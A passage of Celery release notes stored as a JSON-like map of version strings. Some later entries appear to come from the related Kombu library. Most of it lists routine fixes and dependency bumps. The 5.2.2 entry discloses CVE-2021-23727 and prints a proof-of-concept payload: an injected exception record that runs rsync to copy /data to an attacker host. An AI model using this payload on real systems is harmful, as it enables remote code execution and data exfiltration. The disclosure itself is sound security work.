(8527)\n- Fix git bug in Dockerfile (8528)\n- Tox lint upgrade from Python 3.9 to Python 3.11 (8526)\n- Document gevent concurrency (8520)\n- Update test.txt (8530)\n- Celery Docker Upgrades (8531)\n- pyupgrade upgrade v3.11.0 -> v3.13.0 (8535)\n- Update msgpack.txt (8548)\n- Update auth.txt (8547)\n- Update msgpack.txt to fix build issues (8552)\n- Basic ElasticSearch / ElasticClient 8.x Support (8519)\n- Fix eager tasks does not populate name field (8486)\n- Fix typo in celery.app.control (8563)\n- Update solar.txt ephem (8566)\n- Update test.txt pytest-timeout (8565)\n- Correct some mypy errors (8570)\n- Update elasticsearch.txt (8573)\n- Update test.txt deps (8574)\n- Update test.txt (8590)\n- Improved the \"Next steps\" documentation (8561). (8600)\n- Disabled couchbase tests due to broken package breaking main (8602)\n- Update elasticsearch deps (8605)\n- Update cryptography==41.0.5 (8604)\n- Update pytest==7.4.3 (8606)\n- test initial support of python 3.12.x (8549)\n- updated new versions to fix CI (8607)\n- Update zstd.txt (8609)\n- Fixed CI Support with Python 3.12 (8611)\n- updated CI, docs and classifier for next release (8613)\n- updated dockerfile to add python 3.12 (8614)\n- lint,mypy,docker-unit-tests -> Python 3.12 (8617)\n- Correct type of `request` in `task_revoked` documentation (8616)\n- update docs docker image (8618)\n- Fixed RecursionError caused by giving `config_from_object` nested mod\u2026 (8619)\n- Fix: serialization error when gossip working (6566)\n- [documentation] broker_connection_max_retries of 0 does not mean \"retry forever\" (8626)\n- added 2 debian package for better stability in Docker (8629)\n\n.. _version-5.3.4:\n\n", "5.3.4": "=====\n\n:release-date: 2023-09-03 10:10 P.M GMT+2\n:release-by: Tomer Nosrati\n\n.. warning::\n   This version has reverted the breaking changes introduced in 5.3.2 and 5.3.3:\n\n   - Revert \"store children with database backend\" (8475)\n   - Revert \"Fix eager tasks does not populate name field\" (8476)\n\n- Bugfix: Removed unecessary stamping code from _chord.run() (8339)\n- User guide fix (hotfix for 1755) (8342)\n- store children with database backend (8338)\n- Stamping bugfix with group/chord header errback linking (8347)\n- Use argsrepr and kwargsrepr in LOG_RECEIVED (8301)\n- Fixing minor typo in code example in calling.rst (8366)\n- add documents for timeout settings (8373)\n- fix: copyright year (8380)\n- setup.py: enable include_package_data (8379)\n- Fix eager tasks does not populate name field (8383)\n- Update test.txt dependencies (8389)\n- Update auth.txt deps (8392)\n- Fix backend.get_task_meta ignores the result_extended config parameter in mongodb backend (8391)\n- Support preload options for shell and purge commands (8374)\n- Implement safer ArangoDB queries (8351)\n- integration test: cleanup worker after test case (8361)\n- Added \"Tomer Nosrati\" to CONTRIBUTORS.txt (8400)\n- Update README.rst (8404)\n- Update README.rst (8408)\n- fix(canvas): add group index when unrolling tasks (8427)\n- fix(beat): debug statement should only log AsyncResult.id if it exists (8428)\n- Lint fixes & pre-commit autoupdate (8414)\n- Update auth.txt (8435)\n- Update mypy on test.txt (8438)\n- added missing kwargs arguments in some cli cmd (8049)\n- Fix 8431: Set format_date to False when calling _get_result_meta on mongo backend (8432)\n- Docs: rewrite out-of-date code (8441)\n- Limit redis client to 4.x since 5.x fails the test suite (8442)\n- Limit tox to < 4.9 (8443)\n- Fixed issue: Flags broker_connection_retry_on_startup & broker_connection_retry aren\u2019t reliable (8446)\n- doc update from 7651 (8451)\n- Remove tox version limit (8464)\n- Fixed AttributeError: 'str' object has no attribute (8463)\n- Upgraded Kombu from 5.3.1 -> 5.3.2 (8468)\n- Document need for CELERY_ prefix on CLI env vars (8469)\n- Use string value for CELERY_SKIP_CHECKS envvar (8462)\n- Revert \"store children with database backend\" (8475)\n- Revert \"Fix eager tasks does not populate name field\" (8476)\n- Update Changelog (8474)\n- Remove as it seems to be buggy. (8340)\n- Revert \"Add Semgrep to CI\" (8477)\n- Revert \"Revert \"Add Semgrep to CI\"\" (8478)\n\n.. _version-5.3.3:\n\n", "5.3.3": "==============\n\n:release-date: 2023-08-31 1:47 P.M GMT+2\n:release-by: Tomer Nosrati\n\n.. warning::\n   This version has been yanked due to breaking API changes. The breaking changes include:\n\n   - Store children with database backend (8338)\n   - Fix eager tasks does not populate name field (8383)\n\n- Fixed changelog for 5.3.2 release docs.\n\n.. _version-5.3.2:\n\n", "5.3.2": "==============\n\n:release-date: 2023-08-31 1:30 P.M GMT+2\n:release-by: Tomer Nosrati\n\n.. warning::\n   This version has been yanked due to breaking API changes. The breaking changes include:\n\n   - Store children with database backend (8338)\n   - Fix eager tasks does not populate name field (8383)\n\n- Bugfix: Removed unecessary stamping code from _chord.run() (8339)\n- User guide fix (hotfix for 1755) (8342)\n- Store children with database backend (8338)\n- Stamping bugfix with group/chord header errback linking (8347)\n- Use argsrepr and kwargsrepr in LOG_RECEIVED (8301)\n- Fixing minor typo in code example in calling.rst (8366)\n- Add documents for timeout settings (8373)\n- Fix: copyright year (8380)\n- Setup.py: enable include_package_data (8379)\n- Fix eager tasks does not populate name field (8383)\n- Update test.txt dependencies (8389)\n- Update auth.txt deps (8392)\n- Fix backend.get_task_meta ignores the result_extended config parameter in mongodb backend (8391)\n- Support preload options for shell and purge commands (8374)\n- Implement safer ArangoDB queries (8351)\n- Integration test: cleanup worker after test case (8361)\n- Added \"Tomer Nosrati\" to CONTRIBUTORS.txt (8400)\n- Update README.rst (8404)\n- Update README.rst (8408)\n- Fix(canvas): add group index when unrolling tasks (8427)\n- Fix(beat): debug statement should only log AsyncResult.id if it exists (8428)\n- Lint fixes & pre-commit autoupdate (8414)\n- Update auth.txt (8435)\n- Update mypy on test.txt (8438)\n- Added missing kwargs arguments in some cli cmd (8049)\n- Fix 8431: Set format_date to False when calling _get_result_meta on mongo backend (8432)\n- Docs: rewrite out-of-date code (8441)\n- Limit redis client to 4.x since 5.x fails the test suite (8442)\n- Limit tox to < 4.9 (8443)\n- Fixed issue: Flags broker_connection_retry_on_startup & broker_connection_retry aren\u2019t reliable (8446)\n- Doc update from 7651 (8451)\n- Remove tox version limit (8464)\n- Fixed AttributeError: 'str' object has no attribute (8463)\n- Upgraded Kombu from 5.3.1 -> 5.3.2 (8468)\n\n.. _version-5.3.1:\n\n", "5.3.1": "=====\n\n:release-date: 2023-06-18  8:15 P.M GMT+6\n:release-by: Asif Saif Uddin\n\n- Upgrade to latest pycurl release (7069).\n- Limit librabbitmq>=2.0.0; python_version < '3.11' (8302).\n- Added initial support for python 3.11 (8304).\n- ChainMap observers fix (8305).\n- Revert optimization CLI flag behaviour back to original.\n- Restrict redis 4.5.5 as it has severe bugs (8317).\n- Tested pypy 3.10 version in CI (8320).\n- Bump new version of kombu to 5.3.1 (8323).\n- Fixed a small float value of retry_backoff (8295).\n- Limit pyro4 up to python 3.10 only as it is (8324).\n\n.. _version-5.3.0:\n\n", "5.3.0": "=====\n\n:release-date: 2023-06-06 12:00 P.M GMT+6\n:release-by: Asif Saif Uddin\n\n- Test kombu 5.3.0 & minor doc update (8294).\n- Update librabbitmq.txt > 2.0.0 (8292).\n- Upgrade syntax to py3.8 (8281).\n\n.. _version-5.3.0rc2:\n\n", "5.3.0rc2": "========\n\n:release-date: 2023-05-31 9:00 P.M GMT+6\n:release-by: Asif Saif Uddin\n\n- Add missing dependency.\n- Fix exc_type being the exception instance rather.\n- Fixed revoking tasks by stamped headers (8269).\n- Support sqlalchemy 2.0 in tests (8271).\n- Fix docker (8275).\n- Update redis.txt to 4.5 (8278).\n- Update kombu>=5.3.0rc2.\n\n\n.. _version-5.3.0rc1:\n\n", "5.3.0rc1": "========\n\n:release-date: 2023-05-11 4:24 P.M GMT+2\n:release-by: Tomer Nosrati\n\n- fix functiom name by cuishuang in 8087\n- Update CELERY_TASK_EAGER setting in user guide by thebalaa in 8085\n- Stamping documentation fixes & cleanups by Nusnus in 8092\n- switch to maintained pyro5 by auvipy in 8093\n- udate dependencies of tests by auvipy in 8095\n- cryptography==39.0.1 by auvipy in 8096\n- Annotate celery/security/certificate.py by Kludex in 7398\n- Deprecate parse_iso8601 in favor of fromisoformat by stumpylog in 8098\n- pytest==7.2.2 by auvipy in 8106\n- Type annotations for celery/utils/text.py by max-muoto in 8107\n- Update web framework URLs by sblondon in 8112\n- Fix contribution URL by sblondon in 8111\n- Trying to clarify CERT_REQUIRED by pamelafox in 8113\n- Fix potential AttributeError on 'stamps' by Darkheir in 8115\n- Type annotations for celery/apps/beat.py by max-muoto in 8108\n- Fixed bug where retrying a task loses its stamps by Nusnus in 8120\n- Type hints for celery/schedules.py by max-muoto in 8114\n- Reference Gopher Celery in README by marselester in 8131\n- Update sqlalchemy.txt by auvipy in 8136\n- azure-storage-blob 12.15.0 by auvipy in 8137\n- test kombu 5.3.0b3 by auvipy in 8138\n- fix: add expire string parse. by Bidaya0 in 8134\n- Fix worker crash on un-pickleable exceptions by youtux in 8133\n- CLI help output: avoid text rewrapping by click by woutdenolf in 8152\n- Warn when an unnamed periodic task override another one. by iurisilvio in 8143\n- Fix Task.handle_ignore not wrapping exceptions properly by youtux in 8149\n- Hotfix for (8120) - Stamping bug with retry by Nusnus in 8158\n- Fix integration test by youtux in 8156\n- Fixed bug in revoke_by_stamped_headers where impl did not match doc by Nusnus in 8162\n- Align revoke and revoke_by_stamped_headers return values (terminate=True) by Nusnus in 8163\n- Update & simplify GHA pip caching by stumpylog in 8164\n- Update auth.txt by auvipy in 8167\n- Update test.txt versions by auvipy in 8173\n- remove extra = from test.txt by auvipy in 8179\n- Update sqs.txt kombu[sqs]>=5.3.0b3 by auvipy in 8174\n- Added signal triggered before fork by jaroslawporada in 8177\n- Update documentation on SQLAlchemy by max-muoto in 8188\n- Deprecate pytz and use zoneinfo by max-muoto in 8159\n- Update dev.txt by auvipy in 8192\n- Update test.txt by auvipy in 8193\n- Update test-integration.txt by auvipy in 8194\n- Update zstd.txt by auvipy in 8195\n- Update s3.txt by auvipy in 8196\n- Update msgpack.txt by auvipy in 8199\n- Update solar.txt by auvipy in 8198\n- Add Semgrep to CI by Nusnus in 8201\n- Added semgrep to README.rst by Nusnus in 8202\n- Update django.txt by auvipy in 8197\n- Update redis.txt 4.3.6 by auvipy in 8161\n- start removing codecov from pypi by auvipy in 8206\n- Update test.txt dependencies by auvipy in 8205\n- Improved doc for: worker_deduplicate_successful_tasks by Nusnus in 8209\n- Renamed revoked_headers to revoked_stamps by Nusnus in 8210\n- Ensure argument for map is JSON serializable by candleindark in 8229\n\n.. _version-5.3.0b2:\n\n", "5.3.0b3": "=======\n:release-date: 20 Mar, 2023\n:release-by: Asif Saif Uddin\n\n- Use SPDX license expression in project metadata.\n- Allowing Connection.ensure() to retry on specific exceptions given by policy (1629).\n- Redis==4.3.4 temporarilly in an attempt to avoid BC (1634).\n- Add managed identity support to azure storage queue (1631).\n- Support sqla v2.0 (1651).\n- Switch to Pyro5 (1655).\n- Remove unused _setupfuns from serialization.py.\n- Refactor: Refactor utils/json (1659).\n- Adapt the mock to correctly mock the behaviors as implemented on Python 3.10. (Ref 1663).\n\n\n.. _version-5.3.0b2:\n\n", "5.3.0b2": "=======\n\n:release-date: 2023-02-19 1:47 P.M GMT+2\n:release-by: Asif Saif Uddin\n\n- BLM-2: Adding unit tests to chord clone by Nusnus in 7668\n- Fix unknown task error typo by dcecile in 7675\n- rename redis integration test class so that tests are executed by wochinge in 7684\n- Check certificate/private key type when loading them by qrmt in 7680\n- Added integration test_chord_header_id_duplicated_on_rabbitmq_msg_duplication() by Nusnus in 7692\n- New feature flag: allow_error_cb_on_chord_header - allowing setting an error callback on chord header by Nusnus in 7712\n- Update README.rst sorting Python/Celery versions by andrebr in 7714\n- Fixed a bug where stamping a chord body would not use the correct stamping method by Nusnus in 7722\n- Fixed doc duplication typo for Signature.stamp() by Nusnus in 7725\n- Fix issue 7726: variable used in finally block may not be instantiated by woutdenolf in 7727\n- Fixed bug in chord stamping with another chord as a body + unit test by Nusnus in 7730\n- Use \"describe_table\" not \"create_table\" to check for existence of DynamoDB table by maxfirman in 7734\n- Enhancements for task_allow_error_cb_on_chord_header tests and docs by Nusnus in 7744\n- Improved custom stamping visitor documentation by Nusnus in 7745\n- Improved the coverage of test_chord_stamping_body_chord() by Nusnus in 7748\n- billiard >= 3.6.3.0,<5.0 for rpm by auvipy in 7764\n- Fixed memory leak with ETA tasks at connection error when worker_cancel_long_running_tasks_on_connection_loss is enabled by Nusnus in 7771\n- Fixed bug where a chord with header of type tuple was not supported in the link_error flow for task_allow_error_cb_on_chord_header flag by Nusnus in 7772\n- Scheduled weekly dependency update for week 38 by pyup-bot in 7767\n- recreate_module: set spec to the new module by skshetry in 7773\n- Override integration test config using integration-tests-config.json by thedrow in 7778\n- Fixed error handling bugs due to upgrade to a newer version of billiard by Nusnus in 7781\n- Do not recommend using easy_install anymore by jugmac00 in 7789\n- GitHub Workflows security hardening by sashashura in 7768\n- Update ambiguous acks_late doc by Zhong-z in 7728\n- billiard >=4.0.2,<5.0 by auvipy in 7720\n- importlib_metadata remove deprecated entry point interfaces by woutdenolf in 7785\n- Scheduled weekly dependency update for week 41 by pyup-bot in 7798\n- pyzmq>=22.3.0 by auvipy in 7497\n- Remove amqp from the BACKEND_ALISES list by Kludex in 7805\n- Replace print by logger.debug by Kludex in 7809\n- Ignore coverage on except ImportError by Kludex in 7812\n- Add mongodb dependencies to test.txt by Kludex in 7810\n- Fix grammar typos on the whole project by Kludex in 7815\n- Remove isatty wrapper function by Kludex in 7814\n- Remove unused variable _range by Kludex in 7813\n- Add type annotation on concurrency/threads.py by Kludex in 7808\n- Fix linter workflow by Kludex in 7816\n- Scheduled weekly dependency update for week 42 by pyup-bot in 7821\n- Remove .cookiecutterrc by Kludex in 7830\n- Remove .coveragerc file by Kludex in 7826\n- kombu>=5.3.0b2 by auvipy in 7834\n- Fix readthedocs build failure by woutdenolf in 7835\n- Fixed bug in group, chord, chain stamp() method, where the visitor overrides the previously stamps in tasks of these objects by Nusnus in 7825\n- Stabilized test_mutable_errback_called_by_chord_from_group_fail_multiple by Nusnus in 7837\n- Use SPDX license expression in project metadata by RazerM in 7845\n- New control command revoke_by_stamped_headers by Nusnus in 7838\n- Clarify wording in Redis priority docs by strugee in 7853\n- Fix non working example of using celery_worker pytest fixture by paradox-lab in 7857\n- Removed the mandatory requirement to include stamped_headers key when implementing on_signature() by Nusnus in 7856\n- Update serializer docs by sondrelg in 7858\n- Remove reference to old Python version by Kludex in 7829\n- Added on_replace() to Task to allow manipulating the replaced sig with custom changes at the end of the task.replace() by Nusnus in 7860\n- Add clarifying information to completed_count documentation by hankehly in 7873\n- Stabilized test_revoked_by_headers_complex_canvas by Nusnus in 7877\n- StampingVisitor will visit the callbacks and errbacks of the signature by Nusnus in 7867\n- Fix \"rm: no operand\" error in clean-pyc script by hankehly in 7878\n- Add --skip-checks flag to bypass django core checks by mudetz in 7859\n- Scheduled weekly dependency update for week 44 by pyup-bot in 7868\n- Added two new unit tests to callback stamping by Nusnus in 7882\n- Sphinx extension: use inspect.signature to make it Python 3.11 compatible by mathiasertl in 7879\n- cryptography==38.0.3 by auvipy in 7886\n- Canvas.py doc enhancement by Nusnus in 7889\n- Fix typo by sondrelg in 7890\n- fix typos in optional tests by hsk17 in 7876\n- Canvas.py doc enhancement by Nusnus in 7891\n- Fix revoke by headers tests stability by Nusnus in 7892\n- feat: add global keyprefix for backend result keys by kaustavb12 in 7620\n- Canvas.py doc enhancement by Nusnus in 7897\n- fix(sec): upgrade sqlalchemy to 1.2.18 by chncaption in 7899\n- Canvas.py doc enhancement by Nusnus in 7902\n- Fix test warnings by ShaheedHaque in 7906\n- Support for out-of-tree worker pool implementations by ShaheedHaque in 7880\n- Canvas.py doc enhancement by Nusnus in 7907\n- Use bound task in base task example. Closes 7909 by WilliamDEdwards in 7910\n- Allow the stamping visitor itself to set the stamp value type instead of casting it to a list by Nusnus in 7914\n- Stamping a task left the task properties dirty by Nusnus in 7916\n- Fixed bug when chaining a chord with a group by Nusnus in 7919\n- Fixed bug in the stamping visitor mechanism where the request was lacking the stamps in the 'stamps' property by Nusnus in 7928\n- Fixed bug in task_accepted() where the request was not added to the requests but only to the active_requests by Nusnus in 7929\n- Fix bug in TraceInfo._log_error() where the real exception obj was hiding behind 'ExceptionWithTraceback' by Nusnus in 7930\n- Added integration test: test_all_tasks_of_canvas_are_stamped() by Nusnus in 7931\n- Added new example for the stamping mechanism: examples/stamping by Nusnus in 7933\n- Fixed a bug where replacing a stamped task and stamping it again by Nusnus in 7934\n- Bugfix for nested group stamping on task replace by Nusnus in 7935\n- Added integration test test_stamping_example_canvas() by Nusnus in 7937\n- Fixed a bug in losing chain links when unchaining an inner chain with links by Nusnus in 7938\n- Removing as not mandatory by auvipy in 7885\n- Housekeeping for Canvas.py by Nusnus in 7942\n- Scheduled weekly dependency update for week 50 by pyup-bot in 7954\n- try pypy 3.9 in CI by auvipy in 7956\n- sqlalchemy==1.4.45 by auvipy in 7943\n- billiard>=4.1.0,<5.0 by auvipy in 7957\n- feat(typecheck): allow changing type check behavior on the app level; by moaddib666 in 7952\n- Add broker_channel_error_retry option by nkns165 in 7951\n- Add beat_cron_starting_deadline_seconds to prevent unwanted cron runs by abs25 in 7945\n- Scheduled weekly dependency update for week 51 by pyup-bot in 7965\n- Added doc to \"retry_errors\" newly supported field of \"publish_retry_policy\" of the task namespace by Nusnus in 7967\n- Renamed from master to main in the docs and the CI workflows by Nusnus in 7968\n- Fix docs for the exchange to use with worker_direct by alessio-b2c2 in 7973\n- Pin redis==4.3.4 by auvipy in 7974\n- return list of nodes to make sphinx extension compatible with Sphinx 6.0 by mathiasertl in 7978\n- use version range redis>=4.2.2,<4.4.0 by auvipy in 7980\n- Scheduled weekly dependency update for week 01 by pyup-bot in 7987\n- Add annotations to minimise differences with celery-aio-pool's tracer.py. by ShaheedHaque in 7925\n- Fixed bug where linking a stamped task did not add the stamp to the link's options by Nusnus in 7992\n- sqlalchemy==1.4.46 by auvipy in 7995\n- pytz by auvipy in 8002\n- Fix few typos, provide configuration + workflow for codespell to catch any new by yarikoptic in 8023\n- RabbitMQ links update by arnisjuraga in 8031\n- Ignore files generated by tests by Kludex in 7846\n- Revert \"sqlalchemy==1.4.46 (7995)\" by Nusnus in 8033\n- Fixed bug with replacing a stamped task with a chain or a group (inc. links/errlinks) by Nusnus in 8034\n- Fixed formatting in setup.cfg that caused flake8 to misbehave by Nusnus in 8044\n- Removed duplicated import Iterable by Nusnus in 8046\n- Fix docs by Nusnus in 8047\n- Document --logfile default by strugee in 8057\n- Stamping Mechanism Refactoring by Nusnus in 8045\n- result_backend_thread_safe config shares backend across threads by CharlieTruong in 8058\n- Fix cronjob that use day of month and negative UTC timezone by pkyosx in 8053\n- Stamping Mechanism Examples Refactoring by Nusnus in 8060\n- Fixed bug in Task.on_stamp_replaced() by Nusnus in 8061\n- Stamping Mechanism Refactoring 2 by Nusnus in 8064\n- Changed default append_stamps from True to False (meaning duplicates \u2026 by Nusnus in 8068\n- typo in comment: mailicious => malicious by yanick in 8072\n- Fix command for starting flower with specified broker URL by ShukantPal in 8071\n- Improve documentation on ETA/countdown tasks (8069) by norbertcyran in 8075\n\n.. _version-5.3.0b1:\n\n", "5.3.0b1": "=======\n\n:release-date: 2022-08-01 5:15 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Canvas Header Stamping (7384).\n- async chords should pass it's kwargs to the group/body.\n- beat: Suppress banner output with the quiet option (7608).\n- Fix honor Django's TIME_ZONE setting.\n- Don't warn about DEBUG=True for Django.\n- Fixed the on_after_finalize cannot access tasks due to deadlock.\n- Bump kombu>=5.3.0b1,<6.0.\n- Make default worker state limits configurable (7609).\n- Only clear the cache if there are no active writers.\n- Billiard 4.0.1\n\n.. _version-5.3.0a1:\n\n", "5.3.0a1": "=======\n\n:release-date: 2022-06-29 5:15 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Remove Python 3.4 compatibility code.\n- call ping to set connection attr for avoiding redis parse_response error.\n- Use importlib instead of deprecated pkg_resources.\n- fix 7245 uid duplicated in command params.\n- Fix subscribed_to maybe empty (7232).\n- Fix: Celery beat sleeps 300 seconds sometimes even when it should run a task within a few seconds (e.g. 13 seconds) 7290.\n- Add security_key_password option (7292).\n- Limit elasticsearch support to below version 8.0.\n- try new major release of pytest 7 (7330).\n- broker_connection_retry should no longer apply on startup (7300).\n- Remove __ne__ methods (7257).\n- fix 7200 uid and gid.\n- Remove exception-throwing from the signal handler.\n- Add mypy to the pipeline (7383).\n- Expose more debugging information when receiving unknown tasks. (7405)\n- Avoid importing buf_t from billiard's compat module as it was removed.\n- Avoid negating a constant in a loop. (7443)\n- Ensure expiration is of float type when migrating tasks (7385).\n- load_extension_class_names - correct module_name (7406)\n- Bump pymongo[srv]>=4.0.2.\n- Use inspect.getgeneratorstate in asynpool.gen_not_started (7476).\n- Fix test with missing .get() (7479).\n- azure-storage-blob>=12.11.0\n- Make start_worker, setup_default_app reusable outside of pytest.\n- Ensure a proper error message is raised when id for key is empty (7447).\n- Crontab string representation does not match UNIX crontab expression.\n- Worker should exit with ctx.exit to get the right exitcode for non-zero.\n- Fix expiration check (7552).\n- Use callable built-in.\n- Include dont_autoretry_for option in tasks. (7556)\n- fix: Syntax error in arango query.\n- Fix custom headers propagation on task retries (7555).\n- Silence backend warning when eager results are stored.\n- Reduce prefetch count on restart and gradually restore it (7350).\n- Improve workflow primitive subclassing (7593).\n- test kombu>=5.3.0a1,<6.0 (7598).\n- Canvas Header Stamping (7384).\n\n.. _version-5.2.7:\n\n", "5.2.4": "=====\n\n:release-date: 2022-4-03 20:30 P.M UTC+2:00\n:release-by: Omer Katz\n\n- Expose more debugging information when receiving unknown tasks (7404).\n\n.. _version-5.2.3:\n\n", "5.2.3": "=====\n\n:release-date: 2021-12-29 12:00 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Allow redis >= 4.0.2.\n- Upgrade minimum required pymongo version to 3.11.1.\n- tested pypy3.8 beta (6998).\n- Split Signature.__or__ into subclasses' __or__ (7135).\n- Prevent duplication in event loop on Consumer restart.\n- Restrict setuptools>=59.1.1,<59.7.0.\n- Kombu bumped to v5.2.3\n- py-amqp bumped to v5.0.9\n- Some docs & CI improvements.\n\n\n.. _version-5.2.2:\n\n", "5.2.2": "=====\n\n:release-date: 2021-12-26 16:30 P.M UTC+2:00\n:release-by: Omer Katz\n\n- Various documentation fixes.\n- Fix CVE-2021-23727 (Stored Command Injection security vulnerability).\n\n    When a task fails, the failure information is serialized in the backend.\n    In some cases, the exception class is only importable from the\n    consumer's code base. In this case, we reconstruct the exception class\n    so that we can re-raise the error on the process which queried the\n    task's result. This was introduced in 4836.\n    If the recreated exception type isn't an exception, this is a security issue.\n    Without the condition included in this patch, an attacker could inject a remote code execution instruction such as:\n    ``os.system(\"rsync /data attacker192.168.56.100:~/data\")``\n    by setting the task's result to a failure in the result backend with the os,\n    the system function as the exception type and the payload ``rsync /data attacker192.168.56.100:~/data`` as the exception arguments like so:\n\n    .. code-block:: python\n\n        {\n              \"exc_module\": \"os\",\n              'exc_type': \"system\",\n              \"exc_message\": \"rsync /data attacker192.168.56.100:~/data\"\n        }\n\n    According to my analysis, this vulnerability can only be exploited if\n    the producer delayed a task which runs long enough for the\n    attacker to change the result mid-flight, and the producer has\n    polled for the task's result.\n    The attacker would also have to gain access to the result backend.\n    The severity of this security vulnerability is low, but we still\n    recommend upgrading.\n\n\n.. _version-5.2.1:\n\n", "5.2.1": "=====\n\n:release-date: 2021-11-16 8.55 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Fix rstrip usage on bytes instance in ProxyLogger.\n- Pass logfile to ExecStop in celery.service example systemd file.\n- fix: reduce latency of AsyncResult.get under gevent (7052)\n- Limit redis version: <4.0.0.\n- Bump min kombu version to 5.2.2.\n- Change pytz>dev to a PEP 440 compliant pytz>0.dev.0.\n- Remove dependency to case (7077).\n- fix: task expiration is timezone aware if needed (7065).\n- Initial testing of pypy-3.8 beta to CI.\n- Docs, CI & tests cleanups.\n\n\n.. _version-5.2.0:\n\n", "5.2.0rc1": "========\n:release-date: 2021-09-26 4.04 P.M UTC+3:00\n:release-by: Omer Katz\n\n- Kill all workers when main process exits in prefork model (6942).\n- test kombu 5.2.0rc1 (6947).\n- try moto 2.2.x (6948).\n- Prepared Hacker News Post on Release Action.\n- update setup with python 3.7 as minimum.\n- update kombu on setupcfg.\n- Added note about automatic killing all child processes of worker after its termination.\n- [pre-commit.ci] pre-commit autoupdate.\n- Move importskip before greenlet import (6956).\n- amqp: send expiration field to broker if requested by user (6957).\n- Single line drift warning.\n- canvas: fix kwargs argument to prevent recursion (6810) (6959).\n- Allow to enable Events with app.conf mechanism.\n- Warn when expiration date is in the past.\n- Add the Framework :: Celery trove classifier.\n- Give indication whether the task is replacing another (6916).\n- Make setup.py executable.\n- Bump version: 5.2.0b3 \u2192 5.2.0rc1.\n\n.. _version-5.2.0b3:\n\n", "5.1.0b1": "=======\n:release-date: 2021-04-01 10:30 P.M UTC+6:00\n:release-by: Asiff Saif Uddin\n\n- Wheels are no longer universal.\n- Revert \"Added redis transport key_prefix from envvars\".\n- Redis Transport: Small improvements of `SentinelChannel` (1253).\n- Fix pidbox not using default channels.\n- Revert \"on worker restart - restore visible regardless to time (905)\".\n- Add vine to dependencies.\n- Pin urllib3<1.26 to fix failing unittests.\n- Add timeout to producer publish (1269).\n- Remove python2 compatibility code (1277).\n- redis: Support Sentinel with SSL.\n- Support for Azure Service Bus 7.0.0 (1284).\n- Allow specifying session token (1283).\n- kombu/asynchronous/http/curl: implement _set_timeout.\n- Disable namedtuple to object feature in simplejson (1297).\n- Update to tox docker 2.0.\n- SQS back-off policy (1301).\n- Fixed SQS unittests.\n- Fix: non kombu json message decoding in SQS transport (1306).\n- Add Github Actions CI (1309).\n- Update default pickle protocol version to 4 (1314).\n- Update connection.py (1311).\n- Drop support for the lzma backport.\n- Drop obsolete code importing pickle (1315).\n- Update default login method for librabbitmq and pyamqp (936).\n- SQS Broker - handle STS authentication with AWS (1322).\n- Min py-amqp version is v5.0.6 (1325).\n- Numerous docs & example fixes.\n- Use a thread-safe implementation of cached_property (1316).\n\n\n.. _version-5.0.2:\n\n", "4.6.11": "=======\n:release-date: 2020-06-24 1.15 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Revert incompatible changes in 1193 and additional improvements (1211)\n- Default_channel should reconnect automatically (1209)\n\n\n.. _version-4.6.10:\n\n", "4.6.10": "======\n:release-date: 2020-06-03 10.45 A.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Doc improvement.\n- set _connection in _ensure_connection (1205)\n- Fix for the issue 1172\n- reuse connection [bug fix]\n\n\n.. _version-4.6.9:\n\n", "4.6.9": "=====\n:release-date: 2020-06-01 14.00 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Prevent failure if AWS creds are not explicitly defined on predefined.\n- Raise RecoverableConnectionError in maybe_declare with retry on and.\n- Fix for the issue 1172 .\n- possible fix for 1174 .\n- Fix: make SQLAlchemy Channel init thread-safe\n- Added integration testing infrastructure for RabbitMQ\n- Initial redis integration tests implementation\n- SQLAlchemy transport: Use Query.with_for_update() instead of deprecated\n- Fix Consumer Encoding\n- Added Integration tests for direct, topic and fanout exchange types\n- Added TTL integration tests\n- Added integration tests for priority queues\n- fix 100% cpu usage on linux while using sqs\n- Modified Mutex to use redis LuaLock implementation\n- Fix: eliminate remaining race conditions from SQLAlchemy Channel\n- Fix connection imaybe_declare (1196)\n- Fix for issue 1198: Celery crashes in cases where there aren\u2019t enough\n- Ensure connection when connecting to broker\n- update pyamqp to 2.6 with optional cythonization\n\n.. _version-4.6.8:\n\n", "4.6.8": "=====\n:release-date: 2020-03-29 20:45 A.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Added support for health_check_interval option in broker_transport_options (1145)\n- Added retry_on_timeout parameter to Redis Channel (1150)\n- Added support for standard values for ssl_cert_reqs query parameter for Redis (1139)\n- Added predefined_queues option to SQS transport (1156)\n- Added ssl certificate verification against ca certificates when amqps is used for pyamqp transport (1151)\n- Fix issue (701) where kombu.transport.redis.Mutex is broken in python 3 (1141)\n- Fix brop error in Redis Channel (1144)\n\n.. _version-4.6.7:\n\n", "4.6.7": "=====\n:release-date: 2019-12-07 20:45 A.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Use importlib.metadata from the standard library on Python 3.8+ (1086).\n- Add peek lock settings to be changed using transport options (1119).\n- Fix redis health checks (1122).\n- Reset ready before execute callback (1126).\n- Add missing parameter queue_args in kombu.connection.SimpleBuffer (1128)\n\n.. _version-4.6.6:\n\n", "4.6.6": "=====\n:release-date: 2019-11-11 00:15 A.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Revert _lookup_direct and related changes of redis.\n- Python 3.8 support\n- Fix 'NoneType' object has no attribute 'can_read' bug of redis transport\n- Issue 1019 Fix redis transport socket timeout\n- Add wait timeout settings to receive queue message (1110)\n- Bump py-amqp to 2.5.2\n\n.. _version-4.6.5:\n\n", "4.6.5": "=====\n:release-date: 2019-09-30 19:30 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Revert _lookup api and correct redis implemetnation.\n- Major overhaul of redis test cases by adding more full featured fakeredis module.\n- Add more test cases to boost coverage of kombu redis transport.\n- Refactor the producer consumer test cases to be based on original mocks and be passing\n- Fix lingering line length issue in test.\n- Sanitise url when include_password is false\n- Pinned pycurl to 7.43.0.2 as it is the latest build with wheels provided\n- Bump py-amqp to 2.5.2\n\n\n.. _version-4.6.4:\n\n", "4.6.4": "=====\n:release-date: 2019-08-14 22:45 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Use importlib-metadata instead of pkg_resources for better performance\n- Allow users to switch URLs while omitting the resource identifier (1032)\n- Don't stop receiving tasks on 503 SQS error. 